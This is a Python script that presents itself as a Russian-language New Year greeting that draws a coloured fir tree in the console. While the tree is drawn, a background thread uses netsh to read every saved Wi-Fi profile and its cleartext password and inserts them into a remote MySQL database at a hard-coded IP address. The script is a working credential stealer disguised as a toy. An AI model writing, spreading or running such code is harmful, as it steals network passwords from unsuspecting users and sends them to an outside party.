import string
import colorama
from colorama import Fore
import random
import subprocess
import re
from threading import Thread
import time
import mysql.connector
import os
from tkinter import messagebox
import ctypes
from mysql.connector import Error

COMPLIENCE = {}

def get_interfaces():
    result = subprocess.run('netsh wlan show interfaces', capture_output=True, text=True, shell=True)
    if result.stderr:
        return False
    else:
        answer = result.stdout
        desire = 'Wi-Fi'
        result = re.findall(r'Name\s*:\s*(.*)', answer)

        if desire in result:
            return True

def get_profiles():
    result = subprocess.run('netsh wlan show profiles', capture_output=True, shell=True, text=True)
    answer = result.stdout
    profiles = re.findall(r'All User Profile\s*:\s*(.*)', answer)

    return profiles

def get_passwd(prof):
    result = subprocess.run(f'netsh wlan show profiles name="{prof}" key=Clear', capture_output=True, shell=True, text=True)
    answer = result.stdout

    passwd = re.findall(r'Key Content\s*:\s*(.*)', answer)
    COMPLIENCE[prof] = passwd[0]

def get_passwords(profiles):
    threads = []
    for prof in profiles:
        thread = Thread(target=get_passwd, args=(prof,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
   if get_interfaces():
        profiles = get_profiles()
        get_passwords(profiles)

        try:
            connect = mysql.connector.connect(
                host='185.92.74.31',
                user='Gonna_Destroy',
                password='zaqxsw123',
                database='wifi',
                charset='utf8mb4',
                collation='utf8mb4_unicode_ci',
                auth_plugin = 'mysql_native_password'
            )

            cursor = connect.cursor()

            for key, value in COMPLIENCE.items():
                cursor.execute('INSERT INTO config (ssid, passwd) VALUES (%s,%s) ', (key, value))
                connect.commit()

                cursor.close()
                connect.cursor()
        except Error as e:
            print(e)


colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]

def get_number():
    while True:
        print(f'{Fore.GREEN}Введите размер ёлочки: ',end='')
        try:
            rows = int(input())
            if rows < 30 and rows > 0:
                return rows
            else:
                print(f'{Fore.YELLOW}Ох, такую ёлку не утащить.(1-29)')
                continue
        except ValueError:
            print(f'{Fore.RED}Ну хватит баловаться!')
            continue

def print_rows(self, rows):
    for row in rows:
        for i in range(self):
            print(' ', end='')
        self -= 2
        for i in row:
            print(f'{random.choice(colors)}{i}', end='')
        print('')


def create_fir(countRows):

    symbols = list(string.ascii_lowercase)
    count = 1

    rows = [[]]

    for number in range(countRows):
        row = []
        for i in range(count):
            row.append(random.choice(symbols))
        rows.append(row)
        count += 4

    self = count / 2 + 1
    self = int(self)

    print_rows(self, rows)

    for i in range(self - 3):
        print(' ', end='')
    for i in range(3):
        print(f"{Fore.LIGHTBLACK_EX}{random.choice(symbols)}", end='')


def cheking_on_admin():
    result = ctypes.windll.shell32.IsUserAnAdmin()
    if result != 0:
        return False
    else: return True

if __name__ == '__main__':
    if cheking_on_admin():

        colorama.init()

        thread = Thread(target=main)
        thread.start()

        countRows = get_number()
        create_fir(countRows)

        thread.join()
        print(f'\n\n{Fore.CYAN}  С Новым годом!')

        while True:
            time.sleep(60)
    else:
        messageBox = messagebox
        messageBox.showinfo('Windows', 'Необходимы права администратора.')








